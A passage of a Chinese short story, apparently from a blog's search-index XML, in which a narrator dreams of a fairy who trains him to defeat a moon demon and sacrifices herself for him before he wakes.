</p><p>夜幕降临，星星眨着眼睛，似乎在偷窥我内心的秘密，我又开始想念他们了。微风吹过，风中仿佛有一个影子。一条淡淡的影子，带淡淡的香。感到一股寒气从脚底升起，忽然间全身变的冰冷。难道有妖精吗，我怕什么呀，我当你不存在就行了。突然，看见一个梳高髻的人，着羽衣的绝色美人，和壁画上的仙子完全一样。难道她是画上出来的吗？她看着我微笑，笑容是那么甜柔，高贵，纯洁。她不可怕这点是肯定的。我说：“你是人是鬼？”，她反问到：“今天是什么日子？”，我似乎忘记了，想不起来了，管她呢，我避开她。她说：“你难道不想打败月魔吗，不想完成你的使命吗？你连力量的使不出来，那么沮丧有用吗？”。我想了想，还是有点道理的。我问：“这个我还真不知道呀，有人能帮我吗？”，她说：“我能帮你，从今天晚上开始，你要开始学习怎么使用自己的月之神力，但是你会了，也打败不了月魔，因为你灵魂之力激发不出来，灵魂之力开窍就需要牺牲一个人的生命。”。我什么也不说，皱着眉头，说：“废话，开始先！”，修炼开始了。  </p><p>修炼开始了，我已没有任何杂念，很快能领悟到自己的力量是多么的恐怖了。经过一段时间的修炼，我的力量开始饱和了，怎么修炼也不会进步了，开始迷茫了。突然，一个温柔的声音传来了：“你的力量还没到尽头，你需要自己领悟出自己的东西了，走我带你去一个地方吧！”我一看原来是她，就跟着她，看见她手里提着花篮。装满鲜花的从青石上滚落下来，鲜花散落，缤纷如雨。是花雨，不是春雨。这里，没有春雨，只有月，弯月。她从青石上，拔出一柄四尺的巨剑，紧紧的握在手里。淡淡的月光照在剑上，散发出寒冷的光气。  </p><p>她严肃的说：“这把剑不要拿出来，月魔出来了，他会抢走，你现在的力量还不能打败他，如果你死了，我就要死，我的族人也要死掉的，你要找的人不会出现了。”。我其实懂她的意思，于是我把剑要来，拿到手上，感到一股强大的气流往我身上直窜，我能感到力量是多么恐怖。剑似乎有生命了，它在和我交流。当我拿起来的时候，只能感到剑好像要启示我：“你要发挥自己的所有力量，就必须把她的杀掉，把我插到她的心脏里，能把我们的力量发挥到最大，我是剑之灵。”。</p><p>于是，我提起这把剑了，放佛入魔了一般，准备刺了过去。看到她的眼泪不停的流。我怎么下不了手呀！难道你不想见到你心爱的人吗？我要刺过去，不要心软，不要犹豫，不要……。看见她那么流泪，我好想以前似乎在哪里见过。现在，还没到时候，我不去刺了，一下把剑扔到青石里。心到底舍不的，回想起来：我修炼的时候，她一直陪着我；我睡觉的时候，她看着我；我饿的时候，总是她给我找吃的；最重要的是，小葵花在她手里没有凋谢。我向她解释到：“对不起，我下不了手。你刚才的眼神真像我的亲人，我能不能吻一下你的眼睛！”，她深情默默的说：“好的！”她的眼睛大大的，颗淡淡星光透过她的瞳孔，显的多么的具有魔力。青石上，花儿还在飞舞，她闭上双眼，我亲亲吻了一下。我的泪珠不小心撒了一滴，轻轻的坠落下去，与花雨一起纷飞了。</p><p>我的心爱的人们你在哪里？我使出全身的力量向天空散发，发泄一下我的思念，一切都似乎变化了。月儿变的更加有光芒了，天空开始透明，强大的气流使花雨慢慢的飘散了，依稀的能听到远处的大山发出的悲鸣，力量所到之处都是银色月光。此时的她居然在笑，笑的是那么傻，那么甜，那么的纯真，淡淡的说：“你的力量释放出来了，自己的灵魂之力能灌注到月神之力，但是你没有武器，那把剑是终结我生命的，但是击败月魔的武器了。此剑威力被魔的始祖封印了，用此剑的人会被魔力所驱使，陷入无限的痛苦中，开启封印需要用此剑粘上我心脏的血液。”。此时的她，没有悲伤，这个是命中注定的事情，无法改变的，但是死在月神选中的人，总算是心甘情愿了！一切都开始宁静了，青石旁的流水开始呜咽，以前的那幕幕景象已经过去了，现在我必须冷静下来，彻底地冷静下来。有时候一个人活着不是为了享乐，而是忍受痛苦，因为活着只是一种责任谁也逃避不了。 </p><p>她对我说了一声：“看有流星！”。有流星出现的时候，我很少错过的，斜靠在青石上的我，只能感觉到那种夺目的光芒，那种辉煌的刺激，就是我最大的快乐。我看着她，闭着眼睛，默默的祈祷着，是那么认真，是那么可爱，是那么的傻。流星已经消失了，我只感到痛苦，这么好的女孩子为什么要死在我的眼前。我只想抓一颗流星送给她，希望她能开心点儿，但是这件事是不可能的，只是留下幻想而已。对于我这种人来说幻想不但可笑，而且是可耻的。她在我身旁，微笑看着我，说：“你好奇怪呀！没事的，流星飞过的时候我为你祈祷了，你肯定能平安的见到你的亲人和心爱的人的。”，我并没开口说什么，只是心存感激。 </p><p>我想用一切办法避开她，但是有什么用，到最后那把剑还是要在她心窝上穿着，也许这就是命运，也许就那不算太公平。我心爱的人们呀，我为了你们，我必须这样做。</p><p>当我们慢慢的回到月族居住的小村，依稀的能听到：“救命呀，月魔开始屠杀了……”。她带我飞奔到村子的广场，看到一篇狼藉，到处都是血。我看到月魔了，他面目是那么狰狞，眼睛发出恐怖的红光，目光所到之处都带着血腥。一刹那，我使出了所有力量，一拳砸上去，他也回击一拳，强大的气流对撞，使周围的一切都变成了粉末。此时，我的血液已从口中喷出，飞溅在大地上，他一样的也受到同样创伤了。她也使出了自己的月之力，手掌使一道月光照在月魔身上，但是没起任何作用。月魔，手里多了一样东西，弯弯的，红红的，有弯月儿大小的刀，朝她的飞了过去。我使出自己的最大速度，用自己的胸膛顶了过去，还好那东西被我顶住了，我竟然正好站在她面前。我只感到什么也看不见了，把自己的最后所有的力量爆发出来，回击过去，感到一切都消失了。此时月魔的力量也使不出来了，带一道红光飘走了。</p><p>我失去了所有知觉了，心脏开始衰竭。眼前都是黑暗，难道我要死了吗，我还没见到我的心爱的人们，不能这样，不能……。我捏起沉重的拳头，使出最后的一丝力气，击打在自己心脏的位置。他们都对我说：“醒醒，醒醒……”，这个只是幻觉吗？我睁开眼睛，什么也没看到，还是一片黑暗，依稀的听到：“月魔被重伤了，没有死呢，你不能死呀！”顿时，心脏开始有规律的跳动，我猛吸一口气，血液从胸腔流到了嘴上，昏睡过去了。</p><p>这一睡就是一个星期了。我有知觉了，仿佛有一滴鲜鲜的露珠滴到我的口中，我微微的张开双目，看见她眼角挂着泪珠，有一滴掉落在我的小葵花儿上。“我醒了，你怎么了？没事的，给我弄点吃的去。”我小声的说，她去弄吃的了。她开始笑了，是微笑，是傻笑，是甜笑，笑容是那么甜柔，高贵，纯洁。我偷偷的看着她的眼睛，是那么的温柔，那么的明亮，那么的开心，怎么这么像我心爱的女友。她不是，不是我的女友，我要找的是我真正的女友和亲人而不是她。吃完了饭，我感到自己恢复到从前的状态了，力量也恢复了。“今天夜晚，是月圆之夜，是你和月魔决斗的时候，你就要离开我了，我真的舍不得，你为我挡了一刀。我们虽然在一起时间短暂，但是我会记住你的，直到我死去的那一刻，你去把那把剑提来，我帮你把剑的封印解开。”她淡淡的说着，余音袅绕，还是带着那种笑。</p><p>太阳已经西斜，收起了刺眼的光芒。天空一片深蓝。连张绵起伏的西山，披着夕阳的余晖，显得十分壮丽。太阳慢慢地往上沉。它那圆圆的脸涨红了，把身边的云染成了黄色、红色、紫色……，太阳的脸变得更红了。它轻轻地走向西山的背后，把灿烂的霞光留在遥远的天边。我一个人斜靠在青石上，仔细的观察眼前的夕阳美景，总会想起爸爸、妈妈和送我小葵花儿的女孩子，还有要牺牲掉的她。天渐渐黑了，营火虫成群结队的飞舞着，淡淡的绿光照在她的脸上，显地更加精神焕发。圆月挂起，皎洁的月光从夜幕中倾斜下来，轻轻落在大地上，世界上所有的声音似乎渐渐停止了，依稀的能听到青石下的泉水在呜咽，蟋蟀吱吱呜呜的仿佛在哭诉着什么。 </p><p>我提取那把巨剑时，狂风咆哮，大地颤抖，天空黯淡，一切都在变化。月色开始变的暗红，仿佛是月魔的眼睛，发出的光芒给所有的一切笼罩上恐怖的气息。月魔狰狞的面孔依稀的看见了，那带红光的瞳孔只盯在巨剑上。“你快用剑刺我吧……”，她闭上了具有使人灵魂安静的双眼。我举起剑没有向她刺去，而是向那可恶的面孔刺了过去，没有任何效果，直接把剑抛走了。我把自己的灵魂力量注入到月神之力，奋力一击。效果出现了，月魔仿佛被击溃了一样，悄无声息的消失了。我开始微笑了，以为自己赢了。月魔开始咆哮，并没死掉，他是受到创伤了。月魔竟然把那把剑给提了起来，此时我的力量耗尽了，无力反抗了。他举起巨剑朝我刺来，我要被终结了，败了。此刻她抱着我的头，背对着月魔，她竟然为我挡了一下，那把剑已经插她心窝上了，她面带微笑，笑的如此安详，“我的使命完成了，你就能见到……你想要见到的人了，为你牺牲我是自愿的，我走了。”，她就这样的离散在空中，慢慢的消散了，消失不见了。天空显出悲伤的暗蓝，大地发出哭泣的悲鸣，大山也不住的哭泣，所有的花草都在呜咽，整个世界都哀悼着。巨剑已经被唤醒，发出刺目的光芒，我举起巨剑，将自己的全身的力量一点都不留聚集起来，愤怒地向朝月魔刺了过去，狰狞的面孔消失的无影无踪，一切都正常了。月儿发出淡淡的光芒，带上淡淡的哀愁，淡淡的哀伤，淡淡的哭泣。这样的世界似乎有了色彩了，黑色，是我凝视你的眼神；橙色，是爱存在过的记忆；灰色，是擦肩而过的背影；银色，是划过脸庞的泪滴；蓝色，是悲伤汇成的旋律……。我心如刀割，回想起她的一切是那么疼痛。看着那朵金黄的小葵花儿静静的拖着腮，等待着日出，或许得到了一丝丝安慰。 </p><p>流星的光芒短促，但是有什么星星比它璀璨，更辉煌。当流星出现的时候，就算是永恒不变的星座，也夺不去它的光。蝴蝶生命是脆弱的甚至比鲜艳的花还要脆弱，可是永远活在春天里，它美丽，它自由，它飞翔。它的生命很短促却芬芳。 </p><p>清晨，我起床了，原来那是一场梦。爸爸和妈妈在上班前为我准备好了早点，外面送我小葵花儿的女孩子，在等我一起去上学了。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 心情随笔 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 心情随笔 </tag>
+            
+            <tag> 短篇小说 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
